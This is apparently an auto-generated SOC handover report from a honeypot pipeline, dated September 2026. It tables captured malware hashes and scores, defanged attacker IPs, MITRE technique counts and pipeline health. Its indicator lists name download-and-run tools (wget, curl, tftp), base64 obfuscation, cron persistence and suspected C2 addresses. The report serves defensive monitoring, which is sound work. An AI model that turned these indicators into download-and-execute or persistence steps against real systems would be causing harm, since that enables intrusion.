| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.148.10[.]141` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `107.150.146[.]69` | US | Internap Network Services Corporation | **100** ⚠️ | 0 |
| `103.241.43[.]193` | VN | MMO VIET NAM SOFTWARE COMPANY LIMITED | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `138.226.239[.]233` | NL | Vlad Cojuhari | **100** ⚠️ | 4 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 0 |
| `109.160.32[.]64` | BG | Global Communication Net Plc | **100** ⚠️ | 4 |
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 0 |
| `80.94.95[.]116` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `37.32.22[.]70` | IR | AbrArvan IaaS | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 162 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 152 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 41 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 39 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 39 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 192 cases |
| Tool 34  | Credential Extractor        | ✅ 161 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (5.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 152 priority case(s) shown individually · 17 recon entry/entries in table (6 group(s) consolidating 18 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-10T22:22:25Z_
